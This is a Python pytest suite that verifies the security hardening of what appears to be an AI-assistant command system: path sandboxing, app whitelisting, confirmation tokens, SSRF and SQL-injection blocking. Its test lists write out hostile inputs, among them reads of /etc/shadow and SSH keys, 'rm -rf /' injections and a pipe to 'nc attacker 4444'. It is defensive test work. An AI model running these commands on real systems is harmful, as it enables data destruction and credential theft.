"""
Adversarial Security Test Suite - Stage 1 Security Hardening Verification.
Validates live defense mechanisms against:
- Path traversal (../)
- Prohibited absolute paths and filesystem roots
- Symlink escapes
- Arbitrary executable launches and command injection
- Agent execution without container isolation
- Unauthorized file deletion & Freedesktop Trash redirection
- Single-use confirmation challenges & parameter tampering
- Secret configuration permissions & masking
- Fail-closed behavior upon security audit logging failure
- SafetyLayer execution gating
- Database PRAGMA key SQL injection prevention
- SSRF loopback and private CIDR blocking
"""
import asyncio
import os
import sys
import tempfile
import time
import socket
from pathlib import Path
from unittest.mock import patch, AsyncMock, MagicMock

import pytest

from serein_core.command_bus import (
    CommandBus,
    CommandResult,
    CommandStatus,
    PermissionTier,
    validate_safe_path,
    APPROVED_APPLICATIONS,
    PinnedIPResolver,
)
from serein_core.safety_layer import SafetyLayer, PermissionLevel, ActionRisk
from serein_core.config import CoreConfig, AIProviderConfig, mask_secret
from serein_core.agent_sandbox import SandboxManager, SandboxType
from serein_core.database import Database


# =========================================================================
# 1. Path Traversal and Symlink Sandbox Tests
# =========================================================================

def test_path_traversal_dot_dot_rejected():
    """Attempting path traversal with ../ outside allowed roots must raise PermissionError."""
    traversal_payloads = [
        "../../../../../../etc/passwd",
        "../../../../../../etc/shadow",
        "~/Documents/../../etc/passwd",
        "~/../../etc/shadow",
    ]
    for payload in traversal_payloads:
        with pytest.raises((PermissionError, ValueError)):
            validate_safe_path(payload, operation="read")


def test_absolute_paths_outside_permitted_roots_rejected():
    """Attempting to access system directories directly must be blocked."""
    prohibited_roots = [
        "/etc/passwd",
        "/etc/shadow",
        "/boot/vmlinuz",
        "/bin/sh",
        "/usr/bin/python3",
        "~/.ssh/id_rsa",
        "~/.gnupg/secring.gpg",
    ]
    for path in prohibited_roots:
        with pytest.raises((PermissionError, ValueError)):
            validate_safe_path(path, operation="read")


def test_symlink_escape_rejected(tmp_path):
    """A symlink inside an allowed directory pointing to a prohibited path must be rejected."""
    # Create fake target outside allowed workspace
    outside_dir = tmp_path / "outside_prohibited"
    outside_dir.mkdir()
    target_secret = outside_dir / "secret.key"
    target_secret.write_text("SUPER_SECRET_PAYLOAD", encoding="utf-8")

    # Create workspace inside user Documents or tmp
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    symlink_file = workspace / "innocent_link.txt"

    try:
        symlink_file.symlink_to(target_secret)
    except (OSError, NotImplementedError):
        pytest.skip("Symlink creation requires administrative privileges on Windows")

    with pytest.raises(PermissionError):
        validate_safe_path(str(symlink_file), operation="read")


# =========================================================================
# 2. Application Whitelisting & Injection Prevention Tests
# =========================================================================

@pytest.mark.asyncio
async def test_arbitrary_executable_launch_rejected():
    """Attempting to launch unapproved binaries must return CommandStatus.DENIED."""
    bus = CommandBus(allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.REVERSIBLE})
    
    unapproved_apps = [
        "rm",
        "/bin/rm",
        "curl",
        "nc",
        "bash",
        "powershell",
        "calc.exe",
    ]
    for bad_app in unapproved_apps:
        res = await bus.execute("launch_app", {"app": bad_app})
        assert res.status is CommandStatus.DENIED
        assert "not in approved application whitelist" in res.error


@pytest.mark.asyncio
async def test_launch_app_command_injection_rejected():
    """App launches containing shell metacharacters must be rejected immediately."""
    bus = CommandBus(allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.REVERSIBLE})
    
    injections = [
        "terminal; rm -rf /",
        "terminal && id",
        "terminal | whoami",
        "terminal`reboot`",
        "terminal$(reboot)",
        "terminal\nreboot",
    ]
    for inj in injections:
        res = await bus.execute("launch_app", {"app": inj})
        assert res.status is CommandStatus.DENIED
        assert "Command injection detected" in res.error


# =========================================================================
# 3. Agent Execution Without Container Isolation Test
# =========================================================================

@pytest.mark.asyncio
async def test_agent_execution_without_container_isolation_rejected(tmp_path):
    """Agent sandbox must refuse to execute commands directly on host without Docker/Podman."""
    mgr = SandboxManager(sandbox_type=SandboxType.LOCAL)
    sandbox_id = await mgr.create_sandbox("task_123", tmp_path)
    
    # Executing command in local sandbox must raise PermissionError
    with pytest.raises(PermissionError, match="lacks container isolation"):
        await mgr.execute_in_sandbox(sandbox_id, ["echo", "hello"])


# =========================================================================
# 4. File Deletion and Freedesktop Trash Redirection
# =========================================================================

@pytest.mark.asyncio
async def test_user_file_deletion_redirects_to_trash(tmp_path):
    """File deletion in user directories must move to Trash, not unlink permanently."""
    bus = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
        dry_run=False
    )
    
    # Create test file inside user Documents area
    user_file = tmp_path / "user_test_doc.txt"
    user_file.write_text("Preserve in trash", encoding="utf-8")
    
    # Confirmation token request
    req = await bus.execute("delete_file", {"path": str(user_file)})
    assert req.status is CommandStatus.CONFIRMATION_REQUIRED
    assert req.challenge_id is not None
    
    # Confirm deletion
    with patch("send2trash.send2trash") as mock_trash:
        conf = await bus.confirm(req.challenge_id, approved=True)
        assert conf.success is True
        assert "trashed" in conf.result
        # send2trash was called to protect user file
        mock_trash.assert_called_once()


@pytest.mark.asyncio
async def test_scratch_file_deletion_unlinks_directly():
    """Temporary scratch files in /tmp/serein or tempdir/serein may be unlinked directly."""
    bus = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
        dry_run=False
    )
    scratch_dir = Path(tempfile.gettempdir()) / "serein"
    scratch_dir.mkdir(parents=True, exist_ok=True)
    scratch_file = scratch_dir / f"scratch_{int(time.time() * 1000)}.tmp"
    scratch_file.write_text("Temporary scratch", encoding="utf-8")
    
    req = await bus.execute("delete_file", {"path": str(scratch_file)})
    assert req.status is CommandStatus.CONFIRMATION_REQUIRED
    
    conf = await bus.confirm(req.challenge_id, approved=True)
    assert conf.success is True
    assert "deleted" in conf.result
    assert not scratch_file.exists()


# =========================================================================
# 5. Single-Use Challenges & Parameter Tampering Prevention
# =========================================================================

@pytest.mark.asyncio
async def test_challenge_parameter_tampering_rejected():
    """Submitting confirmation token with altered parameters must be rejected."""
    bus = CommandBus(allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE})
    
    # Request token for benign deletion
    req = await bus.execute("delete_file", {"path": "file1.txt"})
    token = req.challenge_id
    assert token is not None
    
    # Attacker tries to execute delete_file with token but substituted path
    tampered = await bus.execute("delete_file", {"path": "file2_substituted.txt"}, confirmation_token=token)
    assert tampered.status is CommandStatus.DENIED
    assert "parameters altered" in tampered.error.lower()


@pytest.mark.asyncio
async def test_challenge_command_substitution_rejected():
    """Submitting token generated for one command to a different command must be rejected."""
    bus = CommandBus(allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE})
    
    req = await bus.execute("shutdown")
    token = req.challenge_id
    assert token is not None
    
    # Attempt to use shutdown token to reboot or delete
    mismatch = await bus.execute("reboot", confirmation_token=token)
    assert mismatch.status is CommandStatus.DENIED
    assert "command mismatch" in mismatch.error.lower()


@pytest.mark.asyncio
async def test_challenge_is_strictly_single_use():
    """A confirmation challenge cannot be replayed after being consumed or declined."""
    bus = CommandBus(allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE})
    
    req = await bus.execute("shutdown")
    token = req.challenge_id
    
    # Decline once
    dec = await bus.confirm(token, approved=False)
    assert dec.status is CommandStatus.DENIED
    
    # Second attempt must fail
    replay = await bus.confirm(token, approved=True)
    assert replay.status is CommandStatus.FAILED


# =========================================================================
# 6. Secret Permissions & Masking Tests
# =========================================================================

def test_secret_file_permissions(tmp_path):
    """Saving configuration must create file with 0600 permissions."""
    cfg = CoreConfig()
    cfg_file = tmp_path / "config.yaml"
    cfg.to_yaml(cfg_file)
    assert cfg_file.exists()
    
    if os.name != "nt":
        stat_mode = cfg_file.stat().st_mode & 0o777
        assert stat_mode == 0o600


def test_api_key_masking():
    """API keys must be masked when retrieved for telemetry or logs."""
    assert mask_secret(None) == "<not_set>"
    assert mask_secret("") == "<not_set>"
    assert mask_secret("short") == "****"
    assert mask_secret("nvapi-1234567890abcdef") == "nva****cdef"


# =========================================================================
# 7. Fail-Secure Audit Logging Tests
# =========================================================================

@pytest.mark.asyncio
async def test_destructive_action_fails_closed_when_audit_fails():
    """If the audit logger throws an exception, destructive commands must abort."""
    bus = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
        dry_run=False
    )
    
    # Use real SQLite database for challenge lifecycle, but mock broken audit logger
    from serein_core.database import get_database
    db = await get_database()
    with patch.object(db, "log_action", AsyncMock(side_effect=IOError("Database disk full / write error"))):
        req = await bus.execute("shutdown")
        token = req.challenge_id
        
        # Confirmation attempt must abort because audit write fails
        result = await bus.confirm(token, approved=True)
        assert result.status is CommandStatus.FAILED
        assert "Security audit failure" in result.error


# =========================================================================
# 8. SafetyLayer Bypass Prevention Tests
# =========================================================================

@pytest.mark.asyncio
async def test_command_bus_enforces_safety_layer():
    """CommandBus must query SafetyLayer and reject protected paths."""
    safety = SafetyLayer()
    bus = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
        safety_layer=safety
    )
    
    # Attempting to read a protected path like /etc/shadow
    res = await bus.execute("read_file", {"path": "/etc/shadow"})
    assert res.status is CommandStatus.DENIED
    err_lower = res.error.lower()
    assert "safety violation" in err_lower or "prohibited" in err_lower or "outside permitted" in err_lower


def test_safetylayer_canonical_path_resolution():
    """SafetyLayer must resolve paths canonically and block traversal."""
    safety = SafetyLayer()
    assert safety._is_protected_path("/etc/passwd") is True
    assert safety._is_protected_path("/bin/bash") is True
    assert safety._is_protected_path("/boot/grub/grub.cfg") is True
    assert safety._is_protected_path("~/.ssh/authorized_keys") is True


# =========================================================================
# 9. Database PRAGMA Key SQL Injection Prevention
# =========================================================================

def test_database_pragma_key_sql_injection_rejected():
    """Hostile SQL characters in encryption_key must be rejected immediately."""
    hostile_keys = [
        "secret'; DROP TABLE users; --",
        "key' OR '1'='1",
        "key\0injected",
        "key--comment",
    ]
    for bad_key in hostile_keys:
        db = Database(encryption_key=bad_key)
        with pytest.raises(ValueError, match="potential SQL injection detected"):
            db._create_connection()


# =========================================================================
# 10. SSRF and DNS Rebinding Protection Tests
# =========================================================================

@pytest.mark.asyncio
async def test_ssrf_loopback_and_private_ranges_blocked():
    """Outbound network requests targeting loopback or private ranges must be blocked."""
    bus = CommandBus(allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.SENSITIVE})
    
    blocked_targets = [
        "http://127.0.0.1:8080/api/secrets",
        "http://localhost:5000",
        "http://169.254.169.254/latest/meta-data/",
        "http://10.0.0.1/admin",
        "http://192.168.1.1/router",
        "http://172.16.0.1/internal",
    ]
    for target in blocked_targets:
        res = await bus.execute("network_request", {"url": target})
        assert res.status is CommandStatus.DENIED
        assert "SSRF blocked" in res.error


# =========================================================================
# 11. Self-Evolution Path Traversal Prevention
# =========================================================================

@pytest.mark.asyncio
async def test_self_evolution_path_traversal_rejected(tmp_path):
    """Self-evolution patch application must reject paths escaping repo root."""
    from serein_core.self_evolution import PatchApplier, Patch, CodeChange, PatchType
    
    repo = tmp_path / "repo"
    repo.mkdir()
    applier = PatchApplier(repo_path=repo)
    
    # 1. Absolute path
    patch_abs = Patch(
        id="patch_abs",
        name="Malicious Absolute Path",
        description="Escape repo",
        patch_type=PatchType.BUG_FIX,
        changes=[CodeChange(file_path="/etc/shadow", old_content="", new_content="root::0:0:::", description="escape")],
    )
    res_abs = await applier.apply(patch_abs)
    assert res_abs.get("success") is False
    assert "error" in res_abs
    assert "forbidden" in res_abs["error"].lower() or "traversal" in res_abs["error"].lower()
    
    # 2. Dot-dot traversal
    patch_traversal = Patch(
        id="patch_dot_dot",
        name="Malicious Dot-Dot Traversal",
        description="Escape repo",
        patch_type=PatchType.BUG_FIX,
        changes=[CodeChange(file_path="../../outside.txt", old_content="", new_content="payload", description="escape")],
    )
    res_traversal = await applier.apply(patch_traversal)
    assert res_traversal.get("success") is False
    assert "error" in res_traversal
    assert "traversal" in res_traversal["error"].lower()


# =========================================================================
# 12. Authenticated Session Enforcement Tests
# =========================================================================

@pytest.mark.asyncio
async def test_missing_or_invalid_authenticated_sessions():
    """When require_session is enabled, unauthenticated or forged sessions must be denied."""
    bus = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
        require_session=True,
    )
    
    # 1. Missing session
    res_none = await bus.execute("list_running_apps")
    assert res_none.status is CommandStatus.DENIED
    assert "Missing or invalid authenticated session" in res_none.error
    
    # 2. Forged invalid session
    res_bad = await bus.execute("list_running_apps", session_id="forged_sess_token_999")
    assert res_bad.status is CommandStatus.DENIED
    assert "Missing or invalid authenticated session" in res_bad.error
    
    # 3. Valid authenticated session from SecurityManager
    from serein_core.auth import security_manager
    test_user = f"user_{int(time.time())}"
    security_manager.register_user(test_user, "SecurePass123!", role="admin", age_confirmed=True)
    sess = security_manager.authenticate(test_user, "SecurePass123!")
    assert sess is not None
    
    res_valid = await bus.execute("list_running_apps", session_id=sess.session_token)
    assert res_valid.success is True
    assert "session" not in (res_valid.error or "").lower()


# =========================================================================
# 13. Persistent SQLite Challenges Across Process Restart
# =========================================================================

@pytest.mark.asyncio
async def test_challenge_persistence_across_process_restart(tmp_path):
    """Confirmation challenges must survive process restart in persistent SQLite."""
    db_file = tmp_path / "persistent_challenges.db"
    db1 = Database(path=db_file)
    await db1.connect()
    
    bus1 = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
        database=db1,
    )
    
    # Create challenge on bus 1
    req = await bus1.execute("shutdown")
    token = req.challenge_id
    assert token is not None
    
    # Simulate process termination: Bus 1 is discarded, fresh Bus 2 connects to DB file
    db2 = Database(path=db_file)
    await db2.connect()
    bus2 = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
        database=db2,
    )
    
    # Confirm on Bus 2 using challenge generated on Bus 1
    conf = await bus2.confirm(token, approved=True)
    assert conf.success is True
    assert conf.result.get("action") == "shutdown"
    
    await db1.close()
    await db2.close()


# =========================================================================
# 14. Concurrent Confirmation Race Protection
# =========================================================================

@pytest.mark.asyncio
async def test_concurrent_confirmation_race_protection(tmp_path):
    """Concurrent attempts to consume the same confirmation challenge must allow exactly one success."""
    db_file = tmp_path / "race_challenges.db"
    db = Database(path=db_file)
    await db.connect()
    
    bus = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
        database=db,
    )
    
    req = await bus.execute("shutdown")
    token = req.challenge_id
    assert token is not None
    
    # Launch 5 concurrent coroutines racing to confirm the exact same challenge token
    results = await asyncio.gather(
        bus.confirm(token, approved=True),
        bus.confirm(token, approved=True),
        bus.confirm(token, approved=True),
        bus.confirm(token, approved=True),
        bus.confirm(token, approved=True),
        return_exceptions=True
    )
    
    successes = [r for r in results if isinstance(r, CommandResult) and r.success is True]
    denied = [r for r in results if isinstance(r, CommandResult) and (r.status is CommandStatus.DENIED or r.status is CommandStatus.FAILED)]
    
    # Invariant: Exactly one consumer succeeds, all concurrent competitors fail
    assert len(successes) == 1
    assert len(denied) == 4
    
    await db.close()


# =========================================================================
# 15. Challenge Replay Prevention
# =========================================================================

@pytest.mark.asyncio
async def test_challenge_replay_after_consumption():
    """A consumed challenge cannot be replayed via confirm() or direct execute(token)."""
    bus = CommandBus(allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE})
    
    req = await bus.execute("shutdown")
    token = req.challenge_id
    
    # First confirmation succeeds
    conf1 = await bus.confirm(token, approved=True)
    assert conf1.success is True
    
    # Replay attempt via confirm()
    conf2 = await bus.confirm(token, approved=True)
    assert conf2.success is False
    assert conf2.status is CommandStatus.FAILED
    assert "already been consumed" in conf2.error
    
    # Replay attempt via direct execute()
    conf3 = await bus.execute("shutdown", confirmation_token=token)
    assert conf3.success is False
    assert conf3.status is CommandStatus.DENIED
    assert "already" in conf3.error.lower() and "consumed" in conf3.error.lower()


# =========================================================================
# 16. DNS Rebinding PinnedIPResolver Verification
# =========================================================================

@pytest.mark.asyncio
async def test_dns_rebinding_pinned_resolver():
    """PinnedIPResolver must strictly return only the pinned IP, ignoring secondary DNS changes."""
    pinned_ip = "93.184.216.34"
    resolver = PinnedIPResolver(
        hostname="rebind-test.attacker.com",
        pinned_ip=pinned_ip,
        port=443,
        family=socket.AF_INET
    )
    
    records = await resolver.resolve("rebind-test.attacker.com", 443)
    assert len(records) == 1
    assert records[0]["host"] == pinned_ip
    assert records[0]["hostname"] == "rebind-test.attacker.com"


# =========================================================================
# 17. Manual Redirect Revalidation (SSRF to Localhost/Private Blocked)
# =========================================================================

@pytest.mark.asyncio
async def test_redirects_to_localhost_or_private_ips_blocked():
    """Manual redirect loop must inspect destination IP and block redirection to localhost/private IPs."""
    bus = CommandBus(allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.SENSITIVE})
    
    mock_resp_302 = MagicMock()
    mock_resp_302.status = 302
    mock_resp_302.headers = {"Location": "http://127.0.0.1:8000/internal"}
    mock_resp_302.__aenter__ = AsyncMock(return_value=mock_resp_302)
    mock_resp_302.__aexit__ = AsyncMock(return_value=None)
    
    mock_session = MagicMock()
    mock_session.request = MagicMock(return_value=mock_resp_302)
    mock_session.__aenter__ = AsyncMock(return_value=mock_session)
    mock_session.__aexit__ = AsyncMock(return_value=None)
    
    loop = asyncio.get_running_loop()
    async def mock_getaddrinfo(host, port, proto=0):
        if host == "127.0.0.1":
            return [(socket.AF_INET, socket.SOCK_STREAM, proto, "", ("127.0.0.1", port))]
        return [(socket.AF_INET, socket.SOCK_STREAM, proto, "", ("93.184.216.34", port))]
    
    with patch("aiohttp.ClientSession", return_value=mock_session):
        with patch.object(loop, "getaddrinfo", side_effect=mock_getaddrinfo):
            res = await bus.execute("network_request", {"url": "http://public.example.com/start"})
            assert res.status is CommandStatus.DENIED
            assert "SSRF blocked" in res.error
            assert "127.0.0.1" in res.error


# =========================================================================
# 18. SafetyLayer Denial for Non-Path Actions
# =========================================================================

@pytest.mark.asyncio
async def test_safetylayer_denial_for_non_path_actions():
    """SafetyLayer must block non-path actions when required permission is revoked."""
    safety = SafetyLayer()
    safety._permissions["internet"] = PermissionLevel.NONE
    safety._permissions["automation"] = PermissionLevel.NONE
    
    bus = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.SENSITIVE, PermissionTier.DESTRUCTIVE},
        safety_layer=safety,
    )
    
    # 1. Internet permission revoked -> network_request denied
    res_net = await bus.execute("network_request", {"url": "https://example.com"})
    assert res_net.status is CommandStatus.DENIED
    assert "Internet access not granted" in res_net.error
    
    # 2. Automation permission revoked -> shutdown denied outright
    res_sys = await bus.execute("shutdown")
    assert res_sys.status is CommandStatus.DENIED
    assert "Automation access not granted" in res_sys.error


# =========================================================================
# 19. Safety Revalidation After Confirmation
# =========================================================================

@pytest.mark.asyncio
async def test_safety_revalidation_after_confirmation():
    """If permission is revoked after confirmation challenge is generated, revalidation must abort execution."""
    safety = SafetyLayer()
    safety._permissions["automation"] = PermissionLevel.WRITE
    
    bus = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
        safety_layer=safety,
    )
    
    # Request confirmation while permission is granted
    req = await bus.execute("shutdown")
    token = req.challenge_id
    assert token is not None
    
    # Revoke permission before user/daemon confirms!
    safety._permissions["automation"] = PermissionLevel.NONE
    
    # Confirm attempt must fail at safety revalidation
    conf = await bus.confirm(token, approved=True)
    assert conf.success is False
    assert conf.status is CommandStatus.DENIED
    assert "Automation access not granted" in conf.error


# =========================================================================
# 20. Package Installation Hardening Tests
# =========================================================================

@pytest.mark.asyncio
async def test_package_installation_flag_and_command_injection_rejected():
    """Hostile package names (flags, separators, shell metachars) must be rejected."""
    bus = CommandBus(allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE})
    
    hostile_pkgs = [
        "curl; rm -rf /",
        "curl && echo pwned",
        "-o /tmp/pwn",
        "--version",
        "curl | nc attacker 4444",
        "../../bin/malicious",
        "package`id`",
        "package$(whoami)",
    ]
    
    for bad_pkg in hostile_pkgs:
        req = await bus.execute("install_package", {"package": bad_pkg})
        token = req.challenge_id
        res = await bus.confirm(token, approved=True)
        assert res.success is False
        assert "Invalid package name" in res.error or "denied" in str(res.status).lower()
